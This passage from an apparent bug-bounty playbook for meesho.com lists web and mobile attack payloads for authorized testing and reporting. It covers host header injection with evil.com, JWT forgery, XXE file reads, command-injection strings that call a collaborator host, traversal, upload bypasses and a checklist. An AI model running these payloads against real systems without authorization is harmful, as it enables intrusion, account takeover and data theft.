Host: evil.com

# Duplicate host
GET / HTTP/1.1
Host: meesho.com
Host: evil.com

# Port injection
GET / HTTP/1.1
Host: meesho.com:evil.com

# X-Forwarded-Host
GET / HTTP/1.1
Host: meesho.com
X-Forwarded-Host: evil.com

# X-Host
GET / HTTP/1.1
Host: meesho.com
X-Host: evil.com

# Absolute URL
GET https://evil.com/ HTTP/1.1
Host: meesho.com
```

### 16.2 Where It Matters

```
1. Password reset emails → Link contains injected host → Token sent to attacker
2. Cache poisoning → Cached page serves attacker's content
3. Server-side redirects → Redirect to attacker's domain
```

---

## 17. JWT Vulnerabilities

### Severity: High to Critical

### 17.1 Decode and Inspect

```
# If auth token looks like: eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.signature
# Decode at https://jwt.io

Check:
1. Algorithm (alg): HS256, RS256, none?
2. Claims: user_id, role, exp, iss
3. Expiration: Is it checked? Can you use expired tokens?
```

### 17.2 Attack Techniques

```
Attack 1: Algorithm None
  Change header from {"alg":"HS256"} to {"alg":"none"}
  Remove signature → base64(header).base64(payload).
  
Attack 2: Algorithm Confusion (RS256 → HS256)
  If server uses RS256, change to HS256
  Sign with the PUBLIC key as HMAC secret

Attack 3: Modify Claims
  Change user_id to admin's ID
  Change role from "user" to "admin"
  Re-sign (only works if you know the secret or with none/confusion)

Attack 4: Expired Token
  Use a token with past expiration date → is it accepted?

Attack 5: Secret Brute Force
  Use jwt_tool or hashcat to brute force weak secrets:
  hashcat -m 16500 jwt.txt wordlist.txt
```

---

## 18. GraphQL Vulnerabilities

### Severity: Medium to Critical

### 18.1 Discovery

```
Try these endpoints:
  /graphql
  /graphiql
  /v1/graphql
  /api/graphql
  /graphql/console
  /gql
```

### 18.2 Introspection Query

```json
{"query":"{__schema{types{name,fields{name,args{name}}}}}"}
```

If introspection is enabled, you get the entire API schema — all types, queries, mutations.

### 18.3 Attacks

```graphql
# IDOR via GraphQL
query { user(id: "OTHER_USER_ID") { name email phone address } }

# Authorization bypass
mutation { updateUser(id: "OTHER_USER_ID", role: "admin") { id role } }

# Batching attack (bypass rate limiting)
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
]

# DoS via deep nesting (just detect, don't exploit)
query { users { friends { friends { friends { friends { name } } } } } }
```

---

## 19. File Upload Vulnerabilities

### Severity: Medium to Critical

### 19.1 Where

```
- Profile picture upload
- Product image upload (seller)
- Support ticket attachments
- Document upload (KYC, invoices)
- Import features (CSV, Excel)
```

### 19.2 Tests

```
Test 1: Upload .html file with XSS
  <script>alert(document.domain)</script>
  → If served without Content-Disposition: attachment → XSS

Test 2: Upload .svg with XSS
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

Test 3: Extension bypass
  file.php → blocked?
  file.php.jpg → allowed?
  file.php%00.jpg → null byte
  file.pHp → case variation
  file.php5, file.phtml → alternative extensions

Test 4: Content-Type bypass
  Upload .php with Content-Type: image/jpeg

Test 5: File size → upload huge file → DoS?

Test 6: File name injection
  Filename: ../../etc/passwd → path traversal
  Filename: <script>alert(1)</script>.jpg → XSS via filename

Test 7: EXIF data XSS
  Embed XSS payload in image EXIF metadata
  exiftool -Comment='<script>alert(1)</script>' image.jpg
```

---

## 20. Path Traversal / LFI

### Severity: High to Critical

### 20.1 Payloads

```
# Basic
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# Encoding
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd  (double encoding)

# Null byte (older systems)
../../../etc/passwd%00.png

# Wrapper (PHP)
php://filter/convert.base64-encode/resource=../../../etc/passwd

# Where to test:
- File download parameters: ?file=, ?path=, ?page=, ?document=
- Image loading: ?img=, ?image=, ?src=
- Include parameters: ?include=, ?template=
- Language selection: ?lang=en → ?lang=../../etc/passwd
```

---

## 21. XXE — XML External Entity

### Severity: High to Critical

### 21.1 When to Test

```
- Any endpoint that accepts XML (Content-Type: application/xml)
- File upload accepting .xlsx, .docx, .svg (these are XML-based)
- SOAP endpoints
- RSS/Atom feed parsers
```

### 21.2 Payloads

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net">]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- XXE in SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- XXE in XLSX (unzip xlsx, modify xml, rezip) -->
```

---

## 22. Command Injection

### Severity: Critical

### 22.1 Where to Test

```
- Any parameter that might be passed to a system command
- File operations (filename, path)
- Network operations (hostname, IP lookup, ping)
- PDF/image generation
- Email sending (recipient address)
```

### 22.2 Payloads

```bash
# Basic
; id
| id
|| id
& id
&& id
`id`
$(id)

# Blind (time-based)
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Blind (out-of-band)
; curl http://YOUR-COLLABORATOR.burpcollaborator.net
; nslookup YOUR-COLLABORATOR.burpcollaborator.net
| wget http://YOUR-COLLABORATOR.burpcollaborator.net

# Newline
%0a id
%0d%0a id

# Windows
& dir
| dir
; dir /w
```

---

## 23. Subdomain Takeover

### Severity: High

### 23.1 Process

```
Step 1: Enumerate subdomains
  → Go to: https://crt.sh/?q=%25.meesho.com
  → Copy all subdomains listed

Step 2: Check CNAME records
  nslookup -type=CNAME subdomain.meesho.com
  dig CNAME subdomain.meesho.com

Step 3: Check if the CNAME target is claimable
  If CNAME points to:
    *.herokuapp.com      → Check if app exists on Heroku
    *.s3.amazonaws.com   → Check if bucket exists
    *.github.io          → Check if repo exists
    *.azurewebsites.net  → Check if app exists
    *.cloudfront.net     → Check if distribution exists
    *.shopify.com        → Check if store exists

Step 4: If the service returns "No such app" or 404
  → Claim the resource on that platform
  → You now control content on meesho's subdomain
  → That's a subdomain takeover
```

### 23.2 Signatures of Takeover

| Service | Error Message |
|---------|--------------|
| Heroku | "No such app" |
| GitHub Pages | "There isn't a GitHub Pages site here" |
| S3 | "NoSuchBucket" |
| Shopify | "Sorry, this shop is currently unavailable" |
| Tumblr | "There's nothing here" |
| Azure | "404 Web Site not found" |

---

## 24. Information Disclosure

### Severity: Low to High

### 24.1 Checklist

```
[ ] Check /robots.txt for hidden paths
[ ] Check /sitemap.xml for unlisted pages
[ ] Check /.well-known/security.txt
[ ] Check /crossdomain.xml
[ ] Check /.git/HEAD → exposed git repo?
[ ] Check /.env → exposed environment variables?
[ ] Check /.DS_Store → exposed directory listing
[ ] Check /server-status → Apache status page
[ ] Check /phpinfo.php → PHP configuration
[ ] Check /elmah.axd → .NET error log
[ ] Check /trace.axd → .NET trace log
[ ] Check /actuator/ → Spring Boot endpoints
[ ] Check /swagger/v1/swagger.json → API documentation
[ ] Check /api-docs → API documentation

[ ] Check response headers for version numbers
[ ] Check error pages for stack traces
[ ] Check JavaScript files for:
    - API keys
    - Internal URLs
    - Debug flags
    - Developer comments
    - Hardcoded credentials
[ ] Check HTML source for:
    - Comments with sensitive info
    - Hidden form fields
    - Internal IPs
    - Debug parameters
    
[ ] Test verbose errors:
    - Send invalid JSON → does it reveal framework?
    - Send wrong Content-Type → does it reveal stack?
    - Send oversized request → does it reveal server info?
    - Access non-existent endpoint → does 404 page leak info?
```

### 24.2 JavaScript Analysis

```
1. Open DevTools → Sources tab
2. Look for .js.map files (source maps) → reveal original source code
3. Search JavaScript for:
   grep -i "api_key\|apikey\|secret\|password\|token\|admin\|internal\|staging\|debug" *.js
4. Look for hardcoded endpoints to internal/staging services
5. Look for feature flags or admin-only features
```

---

## 25. Security Headers & TLS

### Severity: Low (Informational)

### 25.1 Header Check

```bash
curl -s -I https://meesho.com | grep -i "x-frame\|content-security\|strict-transport\|x-content-type\|referrer-policy\|permissions-policy\|x-xss-protection"
```

### Expected Headers

| Header | Expected Value | Impact if Missing |
|--------|---------------|-------------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade attacks |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `Content-Security-Policy` | Restrictive policy | XSS mitigation weakened |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing attacks |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Token leakage via Referer |
| `Permissions-Policy` | Restrictive | Camera/mic/location abuse |

### 25.2 TLS Check

```
Use https://www.ssllabs.com/ssltest/analyze.html?d=meesho.com
Check for:
  - TLS 1.0/1.1 support (should be disabled)
  - Weak cipher suites
  - Certificate issues
  - HSTS preload
```

---

## 26. Mobile Application Testing

### 26.1 Static Analysis

```bash
# Download APK
# Decompile
jadx -d meesho_decompiled/ meesho.apk

# Search for secrets
cd meesho_decompiled/
grep -rn "api_key\|apiKey\|API_KEY\|secret\|SECRET\|password\|token\|TOKEN" .
grep -rn "http://\|https://\|ftp://" . | grep -v meesho.com
grep -rn "firebase\|aws\|azure\|gcp" .

# Check for:
- Hardcoded credentials
- Debug/staging URLs
- Firebase configuration
- AWS access keys
- Internal API endpoints
- Disabled SSL pinning flags
```

### 26.2 Dynamic Analysis

```
1. Set up Android emulator with Burp proxy
2. Install Burp CA cert as system cert (requires root)
3. If certificate pinning blocks you:
   → Use Frida + objection to bypass:
   objection -g com.meesho.supply patchapk --enable-debug
   
4. Intercept all API traffic
5. Mobile APIs often have:
   - Weaker rate limiting
   - More verbose error messages
   - Older API versions with fewer checks
   - Debug endpoints still active
```

### 26.3 Deep Link Testing

```
Find deep links in AndroidManifest.xml:
<intent-filter>
  <data android:scheme="meesho" android:host="..." />
</intent-filter>

Test:
  meesho://product?id=IDOR_TEST
  meesho://profile?user=OTHER_USER
  meesho://payment?redirect=https://evil.com
```

---

## 27. API-Specific Vulnerabilities

### 27.1 Mass Assignment

```json
// Normal request:
PUT /api/users/me
{"name": "Test User"}

// Try adding undocumented fields:
PUT /api/users/me
{
  "name": "Test User",
  "role": "admin",
  "is_admin": true,
  "balance": 999999,
  "verified": true,
  "email_verified": true,
  "phone_verified": true,
  "seller_approved": true,
  "permissions": ["admin", "superuser"],
  "credit_limit": 999999
}
```

### 27.2 Excessive Data Exposure

```
Check API responses for unnecessary data:
  - Does /api/users/me return password hash?
  - Does /api/orders/list return other users' info?
  - Does /api/products return internal fields (cost_price, supplier)?
  - Do list endpoints return more fields than the UI shows?
```

### 27.3 Lack of Rate Limiting

```
Send 100 rapid requests to:
  - Login endpoint (credential brute force)
  - OTP endpoint (OTP brute force)
  - Password reset (OTP brute force)
  - Search endpoint (data scraping)
  - Account creation (spam accounts)

If no 429/blocking → missing rate limit
```

### 27.4 API Versioning

```
If current API is /api/v2/:
  Try /api/v1/ → older version may have fewer security checks
  Try /api/v3/ → beta version may have debug features
  Try /api/internal/ → internal endpoints
  Try /api/admin/ → admin endpoints
```

---

## 28. Web Cache Poisoning

### Severity: Medium to High

### 28.1 Test

```
Step 1: Identify cacheable responses
  → Look for cache headers: Cache-Control, X-Cache, Age, Via

Step 2: Find unkeyed headers (not in cache key but reflected in response)
  → Try X-Forwarded-Host: evil.com
  → If response changes but is cached → cache poisoning

Step 3: Craft poisoned response
  → Inject XSS via X-Forwarded-Host header
  → If cached, all users see the XSS
```

---

## 29. WebSocket Vulnerabilities

### Severity: Medium to High

### 29.1 Detection

```
Look in DevTools → Network → WS filter
Or in Burp → WebSockets history

If Meesho uses WebSockets (chat, notifications, live updates):
```

### 29.2 Tests

```
Test 1: CSWSH (Cross-Site WebSocket Hijacking)
  → Does WebSocket connection check Origin header?
  → Connect from evil.com → does it work?

Test 2: Injection via WebSocket
  → Send XSS payload through WebSocket messages
  → Send SQLi payload through WebSocket messages

Test 3: Authorization
  → Can you subscribe to other users' channels?
  → Can you send messages on behalf of other users?

Test 4: IDOR via WebSocket
  → Change user_id or channel_id in WebSocket messages
```

---

## 30. OAuth / SSO Vulnerabilities

### Severity: High to Critical

### 30.1 If Meesho Uses Google/Facebook Login

```
Test 1: Open Redirect in redirect_uri
  → Change redirect_uri to https://evil.com
  → If allowed → token theft via redirect

Test 2: State Parameter
  → Remove ?state= parameter → CSRF possible
  → Use state from different session
  
Test 3: Token Leakage
  → Is access_token in URL fragment? → leaked via Referer
  → Is code in URL? → leaked via Referer
  
Test 4: Account Linking
  → Login with email → then link Google with DIFFERENT email
  → Can you access two accounts?
  → Can you take over an account by linking their email?

Test 5: Pre-account Takeover
  → Create account with victim's email (no verification)
  → Victim later signs up with Google (same email)
  → Do both accounts merge? → attacker has access
```

---

## Master Checklist — Track Your Progress

```
RECON
[ ] Application fully mapped in Burp Site Map
[ ] All API endpoints documented
[ ] Technology stack identified
[ ] Subdomains enumerated
[ ] JavaScript analyzed for secrets
[ ] robots.txt, sitemap.xml checked

AUTHENTICATION
[ ] OTP brute force tested
[ ] OTP bypass (response manipulation) tested
[ ] OTP reuse tested
[ ] Password reset token analyzed
[ ] Host header on password reset tested
[ ] Session invalidation after logout tested
[ ] Session invalidation after password change tested
[ ] Rate limiting on login tested
[ ] Rate limit bypass (X-Forwarded-For) tested

AUTHORIZATION
[ ] IDOR tested on ALL endpoints with IDs
[ ] Horizontal privilege escalation tested
[ ] Vertical privilege escalation tested (buyer→seller→admin)
[ ] Forced browsing tested (/admin, /internal, etc.)
[ ] HTTP method tampering tested
[ ] Role manipulation tested

INJECTION
[ ] XSS tested on all input fields (reflected + stored)
[ ] DOM XSS tested
[ ] SQL injection tested on all parameters
[ ] SSTI tested on reflected fields
[ ] Command injection tested where applicable
[ ] CRLF injection tested on redirect parameters
[ ] XXE tested on XML-accepting endpoints
[ ] Path traversal tested on file parameters

CLIENT-SIDE
[ ] CSRF tested on all state-changing actions
[ ] Open redirect tested on all redirect parameters
[ ] Clickjacking tested (X-Frame-Options)
[ ] CORS misconfiguration tested
[ ] WebSocket hijacking tested

BUSINESS LOGIC
[ ] Price manipulation tested
[ ] Coupon/discount abuse tested
[ ] Payment flow bypass tested
[ ] Cart manipulation tested
[ ] Referral abuse tested
[ ] Refund abuse tested
[ ] Race conditions tested on critical actions

SERVER/CONFIG
[ ] Security headers checked
[ ] Information disclosure checked
[ ] Error handling checked (verbose errors)
[ ] TLS configuration checked
[ ] Subdomain takeover checked
[ ] Cache poisoning tested
[ ] Host header injection tested

API
[ ] Mass assignment tested
[ ] Excessive data exposure checked
[ ] Rate limiting tested
[ ] API version testing done
[ ] GraphQL introspection checked
[ ] JWT vulnerabilities tested

MOBILE
[ ] APK decompiled and analyzed
[ ] Hardcoded secrets searched
[ ] Certificate pinning checked
[ ] Deep links tested
[ ] Mobile-specific APIs tested

FILE UPLOAD
[ ] Unrestricted file upload tested
[ ] Extension bypass tested
[ ] Content-Type bypass tested
[ ] XSS via file name tested
[ ] XSS via SVG upload tested
```

---

## Quick Reference — Impact Ratings

| Finding | CVSS | HackerOne Severity | Expected Action |
|---------|------|-------------------|-----------------|
| RCE (command injection, SSTI) | 9.0-10.0 | Critical | Report immediately |
| Account Takeover | 9.0-10.0 | Critical | Report immediately |
| IDOR with PII exposure | 7.0-8.9 | High | Report immediately |
| SQL Injection | 7.0-9.8 | High-Critical | Report immediately |
| Payment/Logic bypass | 7.0-9.0 | High | Report immediately |
| SSRF to internal | 6.0-9.0 | Medium-Critical | Report immediately |
| Stored XSS | 6.0-8.0 | Medium-High | Report same day |
| CSRF on critical action | 5.0-7.0 | Medium | Report same day |
| Reflected XSS | 4.0-6.0 | Medium | Report within 24h |
| Open Redirect | 3.0-5.0 | Low-Medium | Report within 48h |
| Info Disclosure | 2.0-5.0 | Low-Medium | Report within 48h |
| Missing Headers | 1.0-3.0 | Low | May not be accepted |

---

*Playbook created: March 1, 2026*  
*REMINDER: Manual testing only. No automated scanners on Meesho production systems.*
